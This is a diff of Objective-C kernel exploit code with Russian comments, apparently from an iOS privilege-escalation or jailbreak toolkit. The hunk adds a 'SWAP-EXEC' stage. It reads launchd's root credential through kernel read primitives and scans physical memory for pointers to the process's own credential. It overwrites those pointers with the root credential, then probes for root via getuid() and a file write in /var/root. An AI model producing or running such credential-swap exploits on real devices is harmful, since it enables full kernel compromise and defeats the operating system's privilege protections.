@@ -8224,25 +8224,65 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     // --- D: карта свапа — пишущиеся 0x21-объекты, держащие
                     // указатели на наш cred / root cred. Каждый хит = точка,
                     // куда можно втыкнуть root cred (kwrite безопасен для 0x21).
+                    // 2.0.31 [SWAP-EXEC] — целевой root-cred берём как ZONE-VA
+                    // из launchd (pid 1, uid=0): proc_ro->ucred. Свапаем каждую
+                    // точку, после каждой — пробы (getuid, /var/root), restore.
                     if (rootCredVA && ucF) {
-                        kpNote(r, @"  [WRIMAP] охота за пишущимися указателями на cred (0x21-кадры)");
-                        uint32_t swapHits = 0;
-                        for (uint64_t i = (0x40000000ULL >> 14); i < wN && swapHits < 16; i++) {
+                        // zone-VA root cred через launchd (апертура ≠ то, что видит ядро)
+                        uint64_t ldProc = [self findProcByPid:1 log:nil];
+                        uint64_t rootZVA = 0;
+                        if (kpLooksLikeKernelPointer(ldProc)) {
+                            uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
+                            uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
+                            uint32_t ldUid = ldUc ? (uint32_t)early_kread64(ldUc + 0x18) : 0xffff;
+                            kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] launchd proc=%#llx proc_ro=%#llx ucred(zoneVA)=%#llx uid=%u",
+                                      (unsigned long long)ldProc, (unsigned long long)ldRo, (unsigned long long)ldUc, ldUid]);
+                            if (ldUid == 0 && kpLooksLikeKernelPointer(ldUc)) rootZVA = ldUc;
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] цель: root cred zoneVA=%#llx (aperture-вид был %#llx)",
+                                  (unsigned long long)rootZVA, (unsigned long long)rootCredVA]);
+                        kpNote(r, @"  [SWAP-EXEC] охота за свап-точками (0x21, указатель на наш ucred)");
+                        struct { uint64_t pa; uint32_t off; uint64_t old; } swp[16];
+                        uint32_t swN = 0;
+                        for (uint64_t i = (0x40000000ULL >> 14); i < wN && swN < 16; i++) {
                             uint64_t pa = wB + (i << 14);
                             if (kpFrameTypeOf(pa) != 0x21) continue;
                             uint64_t al = phystokv(pa);
                             if (!al) continue;
                             for (uint32_t o = 0; o + 8 <= 0x4000; o += 8) {
                                 uint64_t q = early_kread64(al + o);
-                                if (q == ucF || q == rootCredVA) {
-                                    swapHits++;
-                                    kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] ★★ SWAP-точка[%u]: pa=%#llx +%#x → %s (пишется, kwrite-кандидат)",
-                                              swapHits, (unsigned long long)pa, o,
-                                              q == ucF ? "наш ucred" : "root cred"]);
+                                if (q == ucF) {
+                                    swp[swN].pa = pa; swp[swN].off = o; swp[swN].old = q; swN++;
+                                    if (swN >= 16) break;
                                 }
                             }
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [WRIMAP] свап-точек найдено: %u", swapHits]);
+                        kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] свап-точек: %u", swN]);
+                        for (uint32_t si = 0; si < swN && rootZVA; si++) {
+                            uint64_t al = phystokv(swp[si].pa);
+                            if (!al) continue;
+                            // контекст: 4 qword вокруг — опознаём объект
+                            kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] точка[%u] pa=%#llx +%#x контекст: -8=%#llx +8=%#llx +10=%#llx +18=%#llx",
+                                      si, (unsigned long long)swp[si].pa, swp[si].off,
+                                      (unsigned long long)early_kread64(al + swp[si].off - 8),
+                                      (unsigned long long)early_kread64(al + swp[si].off + 8),
+                                      (unsigned long long)early_kread64(al + swp[si].off + 0x10),
+                                      (unsigned long long)early_kread64(al + swp[si].off + 0x18)]);
+                            early_kwrite64(al + swp[si].off, rootZVA);
+                            uint64_t rb = early_kread64(al + swp[si].off);
+                            uid_t sg = getuid();
+                            int pr = open("/private/var/root/kexproof-swap-probe.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                            kpNote(r, [NSString stringWithFormat:@"  [SWAP-EXEC] точка[%u] запись=%#llx (ждём %#llx) getuid()=%u /var/root=%@ — %@",
+                                      si, (unsigned long long)rb, (unsigned long long)rootZVA, sg,
+                                      pr >= 0 ? @"ОТКРЫЛСЯ ★★" : @"нет",
+                                      (rb == rootZVA && (sg == 0 || pr >= 0)) ? @"ROOT ★★" : @"мимо"]);
+                            if (pr >= 0) { close(pr); unlink("/private/var/root/kexproof-swap-probe.txt"); }
+                            if (sg == 0 || rb == rootZVA) {
+                                // не восстанавливаем — может и есть наш root; если пробы мимо — вернём в конце
+                            }
+                            early_kwrite64(al + swp[si].off, swp[si].old);   // restore
+                        }
+                        if (swN) kpNote(r, @"  [SWAP-EXEC] все точки восстановлены");
                     }
                 }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
